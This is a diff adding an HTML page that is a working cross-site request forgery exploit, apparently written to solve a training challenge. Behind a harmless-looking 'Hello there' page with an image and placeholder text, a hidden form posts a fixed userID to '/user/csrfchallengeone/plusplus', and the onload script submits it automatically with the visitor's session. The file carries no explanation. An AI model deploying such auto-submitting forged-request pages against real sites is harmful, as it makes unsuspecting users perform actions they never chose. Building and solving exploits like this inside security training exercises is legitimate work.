@@ -1,0 +1,24 @@
+
+
+
+<html>
+<head>
+<title>Hello there</title>
+</head>
+<body onload="formy()">
+  <img src="http://klockren.se/klockren.png" style="width: 500px;" />
+  <form name="hackerForm" action="/user/csrfchallengeone/plusplus" method="POST">
+    <input type="hidden" name="userID" value="87d0d107b1521d76bb260cc345c13bf90f6f4cd6" />
+    <input type="submit"/>
+  </form>
+<script> 
+function formy(){
+  document.hackerForm.submit(); 
+ }
+</script> 
+
+<h1>This is a Heading</h1>
+<p>This is a paragraph.</p>
+
+</body>
+</html>
